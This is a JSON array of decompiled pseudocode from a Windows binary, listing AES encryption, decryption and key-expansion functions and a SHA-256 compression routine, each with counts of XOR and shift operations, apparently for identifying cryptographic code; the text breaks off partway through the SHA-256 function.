[
    {
        "Function": "sub_406890",
        "Total XOR and shift operations": 103,
        "XOR operations": 76,
        "Shift operations": 27,
        "Operation percentage": "119.77%",
        "Function Body": "\nint __cdecl sub_406890(int *a1, unsigned __int8 *a2, int a3)\n{\n  _DWORD *v4; // eax\n  int v5; // ebx\n  unsigned int v6; // edi\n  int v7; // edx\n  _DWORD *v8; // eax\n  unsigned int v9; // ebx\n  int v10; // ecx\n  int v11; // edx\n  int v12; // ebx\n  int v13; // edx\n  unsigned __int8 v14; // ah\n  int result; // eax\n  int i; // [esp+Ch] [ebp-18h]\n  unsigned int v17; // [esp+Ch] [ebp-18h]\n  unsigned int v18; // [esp+10h] [ebp-14h]\n  unsigned int v19; // [esp+14h] [ebp-10h]\n  unsigned int v20; // [esp+14h] [ebp-10h]\n  unsigned int v21; // [esp+18h] [ebp-Ch]\n  unsigned int v22; // [esp+18h] [ebp-Ch]\n  unsigned int v23; // [esp+1Ch] [ebp-8h]\n  unsigned int v24; // [esp+20h] [ebp-4h]\n  unsigned int v25; // [esp+20h] [ebp-4h]\n  unsigned int v26; // [esp+2Ch] [ebp+8h]\n  int v27; // [esp+2Ch] [ebp+8h]\n  unsigned int v28; // [esp+30h] [ebp+Ch]\n  int v29; // [esp+30h] [ebp+Ch]\n\n  v4 = (_DWORD *)a1[1];\n  v26 = v4[1] ^ (a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8));\n  v5 = *v4 ^ (*a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8));\n  v23 = v5;\n  v6 = v4[2] ^ (a2[8] | ((a2[9] | ((a2[10] | (a2[11] << 8)) << 8)) << 8));\n  v24 = v6;\n  v7 = v4[3] ^ (a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8));\n  v8 = v4 + 4;\n  v28 = v7;\n  for ( i = (*a1 >> 1) - 1; i > 0; --i )\n  {\n    v21 = *v8 ^ dword_421840[(unsigned __int8)v5] ^ dword_422440[HIBYTE(v26)] ^ dword_422040[BYTE2(v6)] ^ dword_421C40[BYTE1(v7)];\n    v19 = v8[1] ^ dword_421840[(unsigned __int8)v26] ^ dword_422440[HIBYTE(v24)] ^ dword_421C40[BYTE1(v5)] ^ dword_422040[BYTE2(v28)];\n    v18 = v8[2] ^ dword_421840[(unsigned __int8)v24] ^ dword_422440[HIBYTE(v28)] ^ dword_422040[BYTE2(v5)] ^ dword_421C40[BYTE1(v26)];\n    v9 = v8[3] ^ dword_421840[(unsigned __int8)v28] ^ dword_422440[HIBYTE(v23)] ^ dword_422040[BYTE2(v26)] ^ dword_421C40[BYTE1(v24)];\n    v23 = v8[4] ^ dword_421840[(unsigned __int8)v21] ^ dword_422440[HIBYTE(v19)] ^ dword_422040[BYTE2(v18)] ^ dword_421C40[(unsigned __int8)((unsigned __int16)(*((_WORD *)v8 + 6) ^ LOWORD(dword_421840[(unsigned __int8)v28]) ^ LOWORD(dword_422440[HIBYTE(v23)]) ^ LOWORD(dword_422040[BYTE2(v26)]) ^ LOWORD(dword_421C40[BYTE1(v24)])) >> 8)];\n    v26 = v8[5] ^ dword_421840[(unsigned __int8)v19] ^ dword_422440[HIBYTE(v18)] ^ dword_421C40[BYTE1(v21)] ^ dword_422040[BYTE2(v9)];\n    v24 = v8[6] ^ dword_421840[(unsigned __int8)v18] ^ dword_422440[HIBYTE(v9)] ^ dword_422040[BYTE2(v21)] ^ dword_421C40[BYTE1(v19)];\n    v6 = v24;\n    v10 = (unsigned __int8)v9;\n    v5 = v23;\n    v7 = v8[7] ^ dword_421840[v10] ^ dword_422440[HIBYTE(v21)] ^ dword_422040[BYTE2(v19)] ^ dword_421C40[BYTE1(v18)];\n    v8 += 8;\n    v28 = v7;\n  }\n  v22 = *v8 ^ dword_421840[(unsigned __int8)v5] ^ dword_422440[HIBYTE(v26)] ^ dword_422040[BYTE2(v6)] ^ dword_421C40[BYTE1(v7)];\n  v20 = v8[1] ^ dword_421840[(unsigned __int8)v26] ^ dword_422440[HIBYTE(v6)] ^ dword_421C40[BYTE1(v5)] ^ dword_422040[BYTE2(v28)];\n  v11 = dword_421C40[BYTE1(v24)];\n  v25 = v8[2] ^ dword_421840[(unsigned __int8)v24] ^ dword_422440[HIBYTE(v28)] ^ dword_422040[BYTE2(v5)] ^ dword_421C40[BYTE1(v26)];\n  v17 = v8[3] ^ dword_421840[(unsigned __int8)v28] ^ dword_422440[HIBYTE(v23)] ^ dword_422040[BYTE2(v26)] ^ v11;\n  v27 = v8[4] ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[(unsigned __int8)v22] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE1(v17)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_421740[HIBYTE(v20)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE2(v25)]) << 8)) << 8);\n  v29 = v8[5] ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[(unsigned __int8)v20] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE1(v22)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_421740[HIBYTE(v25)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE2(v17)]) << 8)) << 8);\n  v12 = v8[6] ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[(unsigned __int8)v25] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE1(v20)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_421740[HIBYTE(v17)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE2(v22)]) << 8)) << 8);\n  v13 = v8[7] ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[(unsigned __int8)v17] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE1(v25)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_421740[HIBYTE(v22)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE2(v20)]) << 8)) << 8);\n  v14 = (unsigned __int16)(*((_WORD *)v8 + 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[(unsigned __int8)v22] ^ (unsigned __int16)(((unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE1(v17)] ^ (unsigned __int16)(((unsigned __int16)((unsigned __int8)RijnDael_AES_inv_LONG_421740[HIBYTE(v20)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_421740[BYTE2(v25)]) << 8)) << 8)) >> 8;\n  *(_BYTE *)a3 = v27;\n  *(_WORD *)(a3 + 1) = __PAIR16__(BYTE2(v27), v14);\n  *(_BYTE *)(a3 + 3) = HIBYTE(v27);\n  *(_DWORD *)(a3 + 4) = v29;\n  *(_BYTE *)(a3 + 9) = BYTE1(v12);\n  *(_BYTE *)(a3 + 10) = BYTE2(v12);\n  *(_BYTE *)(a3 + 13) = BYTE1(v13);\n  *(_BYTE *)(a3 + 8) = v12;\n  *(_BYTE *)(a3 + 12) = v13;\n  *(_BYTE *)(a3 + 11) = HIBYTE(v12);\n  *(_BYTE *)(a3 + 14) = BYTE2(v13);\n  result = 0;\n  *(_BYTE *)(a3 + 15) = HIBYTE(v13);\n  return result;\n}\n// 421840: using guessed type int dword_421840[256];\n// 421C40: using guessed type int dword_421C40[256];\n// 422040: using guessed type int dword_422040[256];\n// 422440: using guessed type int dword_422440[256];\n\n"
    },
    {
        "Function": "sub_406E20",
        "Total XOR and shift operations": 97,
        "XOR operations": 72,
        "Shift operations": 25,
        "Operation percentage": "112.79%",
        "Function Body": "\nint __cdecl sub_406E20(int *a1, unsigned __int8 *a2, int a3)\n{\n  _DWORD *v5; // eax\n  int v6; // ebx\n  unsigned int v7; // ebx\n  int v8; // edx\n  _DWORD *v9; // eax\n  unsigned int v10; // ebx\n  int v11; // ecx\n  int v12; // edx\n  int v13; // edx\n  int v14; // ebx\n  int v15; // edx\n  unsigned __int8 v16; // ah\n  int result; // eax\n  int i; // [esp+Ch] [ebp-18h]\n  unsigned int v19; // [esp+Ch] [ebp-18h]\n  unsigned int v20; // [esp+10h] [ebp-14h]\n  unsigned int v21; // [esp+10h] [ebp-14h]\n  unsigned int v22; // [esp+14h] [ebp-10h]\n  unsigned int v23; // [esp+14h] [ebp-10h]\n  int v24; // [esp+18h] [ebp-Ch]\n  int v25; // [esp+18h] [ebp-Ch]\n  unsigned int v26; // [esp+1Ch] [ebp-8h]\n  unsigned int v27; // [esp+20h] [ebp-4h]\n  unsigned int v28; // [esp+2Ch] [ebp+8h]\n  int v29; // [esp+2Ch] [ebp+8h]\n  unsigned int v30; // [esp+30h] [ebp+Ch]\n  unsigned int v31; // [esp+30h] [ebp+Ch]\n\n  v5 = (_DWORD *)a1[1];\n  v6 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);\n  v30 = v5[1] ^ (a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8));\n  v7 = *v5 ^ v6;\n  v28 = v5[2] ^ (a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8));\n  BYTE1(v24) = BYTE1(v7);\n  v8 = v5[3] ^ (a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8));\n  v9 = v5 + 4;\n  v27 = v8;\n  for ( i = (*a1 >> 1) - 1; i > 0; --i )\n  {\n    v26 = *v9 ^ dword_420740[(unsigned __int8)v7] ^ dword_421340[HIBYTE(v27)] ^ dword_420B40[BYTE1(v30)] ^ dword_420F40[BYTE2(v28)];\n    v22 = v9[1] ^ dword_420740[(unsigned __int8)v30] ^ dword_421340[HIBYTE(v7)] ^ dword_420B40[BYTE1(v28)] ^ dword_420F40[BYTE2(v27)];\n    v20 = v9[2] ^ dword_420740[(unsigned __int8)v28] ^ dword_421340[HIBYTE(v30)] ^ dword_420F40[BYTE2(v7)] ^ dword_420B40[BYTE1(v27)];\n    v10 = v9[3] ^ dword_420740[(unsigned __int8)v27] ^ dword_421340[HIBYTE(v28)] ^ dword_420B40[BYTE1(v7)] ^ dword_420F40[BYTE2(v30)];\n    v24 = v9[4] ^ dword_420740[(unsigned __int8)v26] ^ dword_421340[HIBYTE(v10)] ^ dword_420B40[BYTE1(v22)] ^ dword_420F40[BYTE2(v20)];\n    v30 = v9[5] ^ dword_420740[(unsigned __int8)v22] ^ dword_421340[HIBYTE(v26)] ^ dword_420B40[BYTE1(v20)] ^ dword_420F40[BYTE2(v10)];\n    v28 = v9[6] ^ dword_420740[(unsigned __int8)v20] ^ dword_421340[HIBYTE(v22)] ^ dword_420F40[BYTE2(v26)] ^ dword_420B40[BYTE1(v10)];\n    v11 = (unsigned __int8)v10;\n    v7 = v24;\n    v12 = v9[7] ^ dword_420740[v11] ^ dword_421340[HIBYTE(v20)] ^ dword_420B40[BYTE1(v26)] ^ dword_420F40[BYTE2(v22)];\n    v9 += 8;\n    v27 = v12;\n  }\n  v23 = *v9 ^ dword_420740[(unsigned __int8)v7] ^ dword_421340[HIBYTE(v27)] ^ dword_420B40[BYTE1(v30)] ^ dword_420F40[BYTE2(v28)];\n  v21 = v9[1] ^ dword_420740[(unsigned __int8)v30] ^ dword_421340[HIBYTE(v7)] ^ dword_420B40[BYTE1(v28)] ^ dword_420F40[BYTE2(v27)];\n  v13 = dword_420F40[BYTE2(v30)];\n  v31 = v9[2] ^ dword_420740[(unsigned __int8)v28] ^ dword_421340[HIBYTE(v30)] ^ dword_420F40[BYTE2(v7)] ^ dword_420B40[BYTE1(v27)];\n  v19 = v9[3] ^ dword_420740[(unsigned __int8)v27] ^ dword_421340[HIBYTE(v28)] ^ dword_420B40[BYTE1(v24)] ^ v13;\n  v29 = v9[4] ^ (unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v23] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v21)] ^ ((((unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v19)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v31)]) << 8)) << 8);\n  v25 = v9[5] ^ (unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v21] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v31)] ^ ((((unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v23)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v19)]) << 8)) << 8);\n  v14 = v9[6] ^ (unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v31] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v19)] ^ ((((unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v21)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v23)]) << 8)) << 8);\n  v15 = v9[7] ^ (unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v19] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v23)] ^ ((((unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v31)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v21)]) << 8)) << 8);\n  v16 = (unsigned __int16)(*((_WORD *)v9 + 8) ^ (unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v23] ^ (unsigned __int16)(((unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v21)] ^ (unsigned __int16)(((unsigned __int16)((unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v19)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v31)]) << 8)) << 8)) >> 8;\n  *(_BYTE *)a3 = v29;\n  *(_WORD *)(a3 + 1) = __PAIR16__(BYTE2(v29), v16);\n  *(_BYTE *)(a3 + 3) = HIBYTE(v29);\n  *(_DWORD *)(a3 + 4) = v25;\n  *(_BYTE *)(a3 + 9) = BYTE1(v14);\n  *(_BYTE *)(a3 + 10) = BYTE2(v14);\n  *(_BYTE *)(a3 + 13) = BYTE1(v15);\n  *(_BYTE *)(a3 + 8) = v14;\n  *(_BYTE *)(a3 + 12) = v15;\n  *(_BYTE *)(a3 + 11) = HIBYTE(v14);\n  *(_BYTE *)(a3 + 14) = BYTE2(v15);\n  result = 0;\n  *(_BYTE *)(a3 + 15) = HIBYTE(v15);\n  return result;\n}\n// 420740: using guessed type int dword_420740[256];\n// 420B40: using guessed type int dword_420B40[256];\n// 420F40: using guessed type int dword_420F40[256];\n// 421340: using guessed type int dword_421340[256];\n\n"
    },
    {
        "Function": "sub_406390",
        "Total XOR and shift operations": 156,
        "XOR operations": 115,
        "Shift operations": 41,
        "Operation percentage": "102.63%",
        "Function Body": "\nint __cdecl sub_406390(_DWORD *a1, unsigned __int8 *a2, int a3)\n{\n  _DWORD *v4; // esi\n  int v6; // edi\n  unsigned int v7; // ebx\n  int v8; // esi\n  int v9; // edx\n  int v10; // ecx\n  int v11; // edx\n  unsigned int v12; // ebx\n  int v13; // edi\n  int v14; // esi\n  int v15; // ecx\n  unsigned int v16; // edx\n  int v17; // ebx\n  int v18; // edi\n  int v19; // esi\n  int v20; // ebx\n  unsigned int v21; // edx\n  int v22; // edx\n  int v23; // esi\n  int v24; // ebx\n  int v25; // ecx\n  int v26; // edx\n  int v27; // edi\n  int v28; // esi\n  int v29; // ecx\n  int v30; // edx\n  int v31; // ebx\n  int v32; // edi\n  int v33; // esi\n  int v34; // ecx\n  int v35; // edx\n  int v36; // ebx\n  int v37; // ecx\n  int v38; // edi\n  unsigned int v39; // [esp+4h] [ebp-8h]\n  unsigned int v40; // [esp+4h] [ebp-8h]\n  int v41; // [esp+8h] [ebp-4h]\n  int v42; // [esp+8h] [ebp-4h]\n  int v43; // [esp+8h] [ebp-4h]\n  _DWORD *v44; // [esp+1Ch] [ebp+10h]\n\n  switch ( a3 )\n  {\n    case 128:\n      v4 = a1;\n      *a1 = 10;\n      break;\n    case 192:\n      v4 = a1;\n      *a1 = 12;\n      break;\n    case 256:\n      v4 = a1;\n      *a1 = 14;\n      break;\n    default:\n      return -32;\n  }\n  v4[1] = v4 + 2;\n  v44 = v4 + 2;\n  v6 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);\n  v4[2] = v6;\n  v4[3] = a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8);\n  v4[4] = a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8);\n  v7 = a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8);\n  v4[5] = v7;\n  if ( *v4 == 10 )\n  {\n    v8 = v6 ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v7)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v7)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v7)] ^ ((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v7] << 8)) << 8)) << 8) ^ 1;\n    v9 = v44[2];\n    v10 = v8 ^ v44[1];\n    v44[4] = v8;\n    v11 = v10 ^ v9;\n    v44[5] = v10;\n    v12 = v11 ^ v7;\n    v44[7] = v12;\n    v44[6] = v11;\n    v13 = v8 ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v12)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v12)] ^ ((((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v12] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v12)]) << 8)) << 8) ^ 2;\n    v14 = v10 ^ v13;\n    v44[8] = v13;\n    v44[9] = v10 ^ v13;\n    v15 = v11 ^ v14;\n    v44[10] = v11 ^ v14;\n    v16 = v12 ^ v11 ^ v14;\n    v44[11] = v16;\n    v17 = v13 ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v16)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v16)] ^ ((((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v16] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v16)]) << 8)) << 8) ^ 4;\n    v44[12] = v17;\n    v18 = v14 ^ v17;\n    v44[13] = v14 ^ v17;\n    v19 = v15 ^ v14 ^ v17;\n    v44[14] = v19;\n    v44[15] = v16 ^ v19;\n    v41 = v17 ^ (unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int16)(v16 ^ v19) >> 8] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)((v16 ^ v19) >> 16)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[(v16 ^ v19) >> 24] ^ ((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)(v16 ^ v19)] << 8)) << 8)) << 8) ^ 8;\n    v44[16] = v41;\n    v20 = v18 ^ v41;\n    v44[17] = v18 ^ v41;\n    v44[18] = v19 ^ v18 ^ v41;\n    v21 = v16 ^ v19 ^ v19 ^ v18 ^ v41;\n    v44[19] = v21;\n    v39 = v21;\n    v42 = v41 ^ (unsigned __int8)RijnDael_AES_LONG_420640[BYTE1(v21)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v21)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v21)] ^ ((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v21] << 8)) << 8)) << 8) ^ 0x10;\n    v22 = v20 ^ v42;\n    v44[20] = v42;\n    v44[21] = v20 ^ v42;\n    v23 = v19 ^ v20 ^ v20 ^ v42;\n    v44[22] = v23;\n    v44[23] = v39 ^ v23;\n    v40 = v39 ^ v23;\n    v24 = v42 ^ (unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 93)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[BYTE2(v40)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[HIBYTE(v40)] ^ ((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v40] << 8)) << 8)) << 8) ^ 0x20;\n    v44[24] = v24;\n    v25 = v22 ^ v24;\n    v44[25] = v22 ^ v24;\n    v26 = v23 ^ v22 ^ v24;\n    v44[26] = v26;\n    v44[27] = v40 ^ v26;\n    v27 = v24 ^ (unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 109)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 110)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 111)] ^ ((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)(v40 ^ v26)] << 8)) << 8)) << 8) ^ 0x40;\n    v28 = v25 ^ v27;\n    v44[28] = v27;\n    v44[29] = v25 ^ v27;\n    v29 = v26 ^ v28;\n    v44[30] = v26 ^ v28;\n    v30 = v40 ^ v26 ^ v26 ^ v28;\n    v44[31] = v30;\n    v31 = v27 ^ (unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 125)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 126)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 127)] ^ ((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)v30] << 8)) << 8)) << 8) ^ 0x80;\n    v44[32] = v31;\n    v32 = v28 ^ v31;\n    v44[33] = v28 ^ v31;\n    v33 = v29 ^ v28 ^ v31;\n    v44[34] = v33;\n    v34 = v30 ^ v33;\n    v44[35] = v30 ^ v33;\n    v43 = v31 ^ (unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 141)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 142)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 143)] ^ ((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)(v30 ^ v33)] << 8)) << 8)) << 8) ^ 0x1B;\n    v44[36] = v43;\n    v35 = v33 ^ v32 ^ v43;\n    v44[37] = v32 ^ v43;\n    v36 = v34 ^ v35;\n    v44[39] = v34 ^ v35;\n    v44[38] = v35;\n    v37 = v43 ^ (unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 157)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 158)] ^ (((unsigned __int8)RijnDael_AES_LONG_420640[*((unsigned __int8 *)v44 + 159)] ^ ((unsigned __int8)RijnDael_AES_LONG_420640[(unsigned __int8)(v34 ^ v35)] << 8)) << 8)) << 8) ^ 0x36;\n    v44[40] = v37;\n    v44[41] = v37 ^ v32 ^ v43;\n    v38 = v35 ^ v37 ^ v32 ^ v43;\n    v44[42] = v38;\n    v44[43] = v36 ^ v38;\n  }\n  return 0;\n}\n\n"
    },
    {
        "Function": "sub_4073B0",
        "Total XOR and shift operations": 147,
        "XOR operations": 128,
        "Shift operations": 19,
        "Operation percentage": "43.75%",
        "Function Body": "\nint __cdecl sub_4073B0(_DWORD *a1, int a2)\n{\n  int v2; // edx\n  int v3; // esi\n  int v4; // eax\n  unsigned int v5; // ebx\n  int v6; // edi\n  int v7; // eax\n  int v8; // ecx\n  int v9; // ebx\n  unsigned int v10; // eax\n  int v11; // edi\n  int v12; // ebx\n  int v13; // edi\n  int v14; // edi\n  int v15; // edi\n  int v16; // esi\n  unsigned int v17; // esi\n  char *v18; // esi\n  int v19; // esi\n  int v20; // esi\n  int v21; // edx\n  unsigned int v22; // ecx\n  unsigned int v23; // ebx\n  char *v24; // edi\n  unsigned int v25; // esi\n  int v26; // ecx\n  int v27; // edx\n  int v28; // esi\n  int v29; // ecx\n  unsigned int v30; // edi\n  int v31; // esi\n  int v32; // ecx\n  unsigned int v33; // ebx\n  int v34; // edx\n  int v35; // esi\n  unsigned int v36; // esi\n  int v37; // ecx\n  int v38; // edi\n  int v39; // edx\n  unsigned int v40; // edi\n  int v41; // edx\n  int v42; // ebx\n  int v43; // ecx\n  int v44; // edx\n  int v45; // ecx\n  int v46; // esi\n  int v47; // edx\n  unsigned int v48; // ebx\n  int v49; // edx\n  int v50; // esi\n  int v51; // ecx\n  int v52; // edi\n  int v53; // esi\n  unsigned int v54; // edi\n  int v55; // ecx\n  int v56; // ebx\n  int v57; // esi\n  unsigned int v58; // ebx\n  unsigned int v59; // edx\n  int v60; // edi\n  int v61; // ecx\n  int v62; // esi\n  int v63; // esi\n  int v64; // edi\n  int v65; // esi\n  int v66; // edx\n  int v67; // ecx\n  int v68; // esi\n  int v69; // esi\n  int v70; // ebx\n  int v71; // edi\n  int v72; // edx\n  int v73; // eax\n  int v75[79]; // [esp+0h] [ebp-174h] BYREF\n  int v76; // [esp+13Ch] [ebp-38h]\n  unsigned int v77; // [esp+140h] [ebp-34h]\n  unsigned int v78; // [esp+144h] [ebp-30h]\n  unsigned int v79; // [esp+148h] [ebp-2Ch]\n  char *v80; // [esp+14Ch] [ebp-28h]\n  int v81; // [esp+150h] [ebp-24h]\n  int v82; // [esp+154h] [ebp-20h]\n  int v83; // [esp+158h] [ebp-1Ch]\n  int v84; // [esp+15Ch] [ebp-18h]\n  int v85; // [esp+160h] [ebp-14h]\n  int v86; // [esp+164h] [ebp-10h]\n  int v87; // [esp+168h] [ebp-Ch]\n  int v88; // [esp+16Ch] [ebp-8h]\n  unsigned int v89; // [esp+170h] [ebp-4h]\n\n  v2 = a1[6];\n  v3 = a1[7];\n  v76 = a1[2];\n  v81 = a1[3];\n  v85 = a1[4];\n  v86 = a1[5];\n  v4 = a1[8];\n  v83 = v76;\n  v5 = 0;\n  v88 = v4;\n  v6 = a2 + 2;\n  v7 = a1[9];\n  v82 = v2;\n  v87 = v3;\n  v84 = v7;\n  do\n  {\n    v8 = *(unsigned __int8 *)(v6 - 2);\n    v6 += 4;\n    v75[v5++ + 15] = *(unsigned __int8 *)(v6 - 3) | ((*(unsigned __int8 *)(v6 - 4) | ((*(unsigned __int8 *)(v6 - 5) | (v8 << 8)) << 8)) << 8);\n  }\n  while ( v5 < 0x10 );\n  v9 = v83;\n  v10 = 0;\n  while ( 1 )\n  {\n    v11 = v84\n        + v75[v10 + 15]\n        + dword_422840[v10]\n        + (v88 ^ v2 & (v88 ^ v3))\n        + (__ROR4__(v2, 6) ^ __ROL4__(v2, 7) ^ __ROR4__(v2, 11));\n    v84 = v11 + v86;\n    v12 = v11 + (__ROR4__(v9, 2) ^ __ROL4__(v9, 10) ^ __ROR4__(v9, 13)) + (v85 & (v9 | v81) | v81 & v9);\n    v13 = v88\n        + v75[v10 + 16]\n        + dword_422844[v10]\n        + (v87 ^ (v11 + v86) & (v82 ^ v87))\n        + (__ROR4__(v11 + v86, 6) ^ __ROL4__(v11 + v86, 7) ^ __ROR4__(v11 + v86, 11));\n    v89 = v13 + v85;\n    v88 = v13 + (__ROR4__(v12, 2) ^ __ROL4__(v12, 10) ^ __ROR4__(v12, 13)) + (v81 & (v12 | v83) | v12 & v83);\n    v14 = v87\n        + v75[v10 + 17]\n        + dword_422848[v10]\n        + (v82 ^ (v13 + v85) & (v82 ^ v84))\n        + (__ROR4__(v13 + v85, 6) ^ __ROL4__(v13 + v85, 7) ^ __ROR4__(v13 + v85, 11));\n    v80 = (char *)(v14 + v81);\n    v87 = v14 + (__ROR4__(v88, 2) ^ __ROL4__(v88, 10) ^ __ROR4__(v88, 13)) + (v83 & (v12 | v88) | v12 & v88);\n    v15 = v82\n        + v75[v10 + 18]\n        + dword_42284C[v10]\n        + (v84 ^ (v14 + v81) & (v89 ^ v84))\n        + (__ROR4__(v14 + v81, 6) ^ __ROL4__(v14 + v81, 7) ^ __ROR4__(v14 + v81, 11));\n    v83 += v15;\n    v82 = v15 + (__ROR4__(v87, 2) ^ __ROL4__(v87, 10) ^ __ROR4__(v87, 13)) + (v12 & (v88 | v87) | v88 & v87);\n    v16 = v84\n        + v75[v10 + 19]\n        + dword_422850[v10]\n        + (v89 ^ v83 & (v89 ^ (unsigned int)v80))\n        + (__ROR4__(v83, 6) ^ __ROL4__(v83, 7) ^ __ROR4__(v83, 11));\n    v84 = v12 + v16;\n    v86 = v16 + (__ROR4__(v82, 2) ^ __ROL4__(v82, 10) ^ __ROR4__(v82, 13)) + (v87 & v82 | v88 & (v87 | v82));\n    v17 = v89\n        + v75[v10 + 20]\n        + dword_422854[v10]\n        + ((unsigned int)v80 ^ v84 & (v83 ^ (unsigned int)v80))\n        + (__ROR4__(v84, 6) ^ __ROL4__(v12 + v16, 7) ^ __ROR4__(v12 + v16, 11));\n    v88 += v17;\n    v85 = v87 & (v82 | v86);\n    v85 |= v82 & v86;\n    v85 += v17 + (__ROR4__(v86, 2) ^ __ROL4__(v86, 10) ^ __ROR4__(v86, 13));\n    v18 = &v80[v75[v10 + 21]\n             + dword_422858[v10]\n             + (v83 ^ v88 & (v84 ^ v83))\n             + (__ROR4__(v88, 6) ^ __ROL4__(v88, 7) ^ __ROR4__(v88, 11))];\n    v87 += (int)v18;\n    v81 = v82 & (v86 | v85);\n    v81 |= v86 & v85;\n    v81 += (int)&v18[__ROR4__(v85, 2) ^ __ROL4__(v85, 10) ^ __ROR4__(v85, 13)];\n    v19 = v75[v10 + 22]\n        + dword_42285C[v10]\n        + (v84 ^ v87 & (v88 ^ v84))\n        + (__ROR4__(v87, 6) ^ __ROL4__(v87, 7) ^ __ROR4__(v87, 11));\n    v10 += 8;\n    v20 = v83 + v19;\n    v82 += v20;\n    v21 = v20 + (__ROR4__(v81, 2) ^ 